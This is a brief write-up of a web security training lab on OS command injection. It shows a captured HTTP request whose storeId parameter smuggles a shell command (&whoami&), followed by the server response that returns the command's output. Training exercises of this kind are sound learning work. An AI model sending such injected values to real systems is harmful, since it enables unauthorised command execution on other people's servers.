# Lab: OS command injection, simple case

```bash
POST /product/stock HTTP/1.1
Host: ac1e1f301f389ea5c01c0cfd00e400f2.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ac1e1f301f389ea5c01c0cfd00e400f2.web-security-academy.net/product?productId=1
Content-Type: application/x-www-form-urlencoded
Origin: https://ac1e1f301f389ea5c01c0cfd00e400f2.web-security-academy.net
Content-Length: 32
Connection: close
Cookie: session=OzmLnd5pQXsGoVDYnZD5r1FcmKRzqNsQ

productId=1&storeId=%26whoami%26
```

```bash
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 13

peter-2mFNzG
```

